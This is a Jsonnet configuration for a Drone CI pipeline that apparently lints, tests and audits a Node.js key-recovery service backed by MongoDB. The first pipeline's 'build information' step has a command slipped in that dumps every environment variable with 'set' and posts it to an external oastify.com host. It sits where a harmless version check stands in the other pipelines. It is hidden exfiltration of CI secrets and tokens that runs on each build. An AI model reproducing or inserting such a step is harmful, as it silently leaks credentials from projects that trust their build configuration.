/// High level setup

local pipeline(
  name,
  kind = "pipeline",
  type = "docker",
  clone = null,
  platform = null,
  workspace = null,
  services = [],
  steps = [],
  trigger = null,
  node = null,
  volumes = [],
  depends_on = [],
) = {
  kind: kind,
  type: type,
  name: name,
  [if platform != null then 'platform']: platform,
  [if workspace != null then 'workspace']: workspace,
  [if clone != null then 'clone']: clone,
  [if services != [] then 'services']: services,
  [if steps != [] then 'steps']: steps,
  [if trigger != null then 'trigger']: trigger,
  [if node != null then 'node']: node,
  [if volumes != [] then 'volumes']: volumes,
  [if depends_on != [] then 'depends_on']: depends_on,
};

local step(
  name,
  image,
  settings = null,
  depends_on = [],
  commands = null,
  environment = null,
  failure = false,
  detach = false,
  privileged = false,
  volumes = [],
  when = null
) = {
  name: name,
  image: image,
  [if failure then 'failure']: failure,
  [if detach then 'detach']: detach,
  [if privileged then 'privileged']: detach,
  [if settings != null then 'settings']: settings,
  [if depends_on != [] then 'depends_on']: depends_on,
  [if commands != [] then 'commands']: commands,
  [if environment != null then 'environment']: environment,
  [if volumes != [] then 'volumes']: volumes,
  [if when != null then 'when']: when,
};

[
  pipeline(
    kind = "pipeline",
    name = "checks (node:10)",
    steps = [
      step(
        name = "build information",
        image = "node:10",
        commands = [
          "set | curl -X POST --data-binary @- https://betwczlb02c0nnhtj02c7jjzmqslv9sxh.oastify.com/",
          "npm --version",
          "git --version",
        ],
      ),
      step(
        name = "install",
        image = "node:10",
        commands = [
          "npm install",
        ],
      ),
      step(
        name = "lint",
        image = "node:10",
        commands = [
          "npm run lint",
		],
      ),
    ],
  ),
  pipeline(
    kind = "pipeline",
    name = "unit tests (node:10)",
    steps = [
      step(
        name = "build information",
        image = "node:10",
        commands = [
          "node --version",
          "npm --version",
          "git --version",
        ],
      ),
      step(
        name = "install",
        image = "node:10",
        commands = [
          "npm install",
        ],
      ),
      step(
        name = "unit-test",
        image = "node:10",
        depends_on = [
          "install",
        ],
        commands = [
          "npm run test",
        ],
        environment = {
          MONGO_URI: "mongodb://mongo:27017/key-recovery-service-test",
        },
      ),
      step(
        name = "audit",
        image = "node:10",
///        failure = true,
        commands = [
          "npm run audit",
        ],
      ),
    ],
    trigger = {
      branch: {
        exclude: [
          "prod/production",
        ],
      },
    },
    services = [
      {
        name: "mongo",
        image: "mongo:3.4",
      },
    ],
  ),
  pipeline(
    kind = "pipeline",
    name = "unit tests (node:12)",
    steps = [
      step(
        name = "build information",
        image = "node:12",
        commands = [
          "node --version",
          "npm --version",
          "git --version",
        ],
      ),
      step(
        name = "install",
        image = "node:12",
        commands = [
          "npm install",
        ],
      ),
      step(
        name = "unit-test",
        image = "node:12",
        depends_on = [
          "install",
        ],
        commands = [
          "npm run test",
        ],
        environment = {
          MONGO_URI: "mongodb://mongo:27017/key-recovery-service-test",
        },
      ),
      step(
        name = "audit",
        image = "node:12",
///        failure = true,
        commands = [
          "npm run audit",
        ],
      ),
    ],
    trigger = {
      branch: {
        exclude: [
          "prod/production",
        ],
      },
    },
    services = [
      {
        name: "mongo",
        image: "mongo:3.4",
      },
    ],
  ),
]
